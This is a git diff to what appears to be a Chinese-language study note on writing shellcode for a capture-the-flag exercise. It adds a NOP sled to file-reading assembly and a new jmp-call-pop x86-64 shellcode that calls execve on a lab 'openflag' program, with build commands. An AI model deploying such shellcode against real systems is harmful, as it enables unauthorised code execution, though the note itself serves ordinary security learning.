@@ -17,6 +17,8 @@ comments: true
   - [5.1 Remaining Injection Points - de-protecting memory](#51-remaining-injection-points---de-protecting-memory)
   - [5.2 Remaining Injection Points - JIT](#52-remaining-injection-points---jit)
 - [6. shellcode instance](#6-shellcode-instance)
+  - [6.1 直接编写shellcode](#61-直接编写shellcode)
+  - [6.2 shellcode作为跳板，执行其他程序](#62-shellcode作为跳板执行其他程序)
 
 
 ## 1. 介绍: shellcode是什么<br>
@@ -185,6 +187,7 @@ etc...
 
 
 ## 6. shellcode instance<br>
+### 6.1 直接编写shellcode<br>
 使用如下命令进行编译:<br>
 ```
 gcc -nostdlib -static shellcode.s -o shellcode.elf
@@ -195,6 +198,7 @@ objcopy --dump-section .text=shellcode.raw shellcode.elf
 .global _start
 _start:
 .intel_syntax noprefix
+.fill 0x800, 1, 0x90 # fill with nop
         mov rax, 2 # sys_create
         lea rdi, [rip+file_name] # file_name
         mov rsi, 2 # O_RDWR
@@ -224,3 +228,34 @@ buffer:
 buffer_len:
         .long 0x100
 ```
+
+### 6.2 shellcode作为跳板，执行其他程序<br>
+这段代码使用`nasm`来进行编译，所以使用方法如下:<br>
+```
+nasm -f elf64 -o shellcode.o shellcode.s
+objcopy --dump-section .text=shellcode.raw shellcode.o
+gcc shellcode.o -o shellcode.elf #可执行代码,实际上也不需要它就是了
+```
+代码如下:<br>
+```
+BITS 64
+
+section .text
+global main
+
+main:
+    jmp short call_shellcode
+
+get_address:
+    pop rdi                     ; 将字符串地址弹出到RDI中
+    xor rsi, rsi                ; 清空RSI
+    xor rdx, rdx                ; 清空RDX
+    mov al, 0x3b                ; syscall编号execve
+    syscall                     ; 执行系统调用
+    ret 
+call_shellcode:
+    call get_address            ; get string addr
+    db '/home/hacker/Shellcode/level3/openflag'               ;
+```
+
+可执行程序就简单了，用c写个程序然后执行它即可。<br>
